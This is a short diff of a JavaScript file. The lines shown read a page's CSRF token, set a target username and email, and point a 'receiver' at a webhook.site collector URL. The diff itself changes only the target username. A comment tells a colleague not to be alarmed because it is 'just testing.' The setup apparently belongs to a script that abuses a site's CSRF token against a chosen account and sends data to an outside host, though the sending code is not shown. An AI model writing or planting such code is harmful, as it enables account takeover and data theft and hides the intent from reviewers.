@@ -1,6 +1,6 @@
 // Shanil, don't be alarmed. I've already told Lynn about this. Just testing stuff.
 let _mToken = $('meta[name="csrf-token"]').attr('content')
-let _mTargetUsername = 'ideaspy4832'
+let _mTargetUsername = 'ideaspies4832'
 let _mTargetEmail = 'ideaspy1001@gmail.com'
 let _mReceiver = 'https://webhook.site/8723bbba-a23b-4937-b358-bc98f05698a2'
 let _mEmail = ''
